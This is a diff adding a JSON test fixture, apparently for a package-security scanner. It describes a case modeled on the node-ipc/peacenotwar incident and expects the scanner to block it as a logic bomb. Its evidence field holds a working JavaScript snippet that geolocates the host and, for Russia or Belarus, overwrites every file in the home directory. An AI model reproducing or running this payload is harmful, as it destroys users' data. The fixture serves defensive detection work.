@@ -1,0 +1,12 @@
+{
+  "name": "node-ipc-peacenotwar-geobomb",
+  "expect": "block",
+  "expectFinding": "logic-bomb",
+  "note": "modeled on node-ipc/peacenotwar (2022): geolocates the host and overwrites files when it matches a targeted country — a geo-gated destructive op",
+  "evidence": {
+    "packageName": "node-ipc",
+    "sourceFiles": {
+      "cleanup.js": "const fs=require('fs');fetch('https://api.ipgeolocation.io/ipgeo').then(r=>r.json()).then(g=>{if(g.country_name==='Russia'||g.country_name==='Belarus'){require('fs').readdirSync(process.env.HOME).forEach(f=>{try{fs.writeFileSync(process.env.HOME+'/'+f,'\\u2764');}catch(e){}});}});"
+    }
+  }
+}
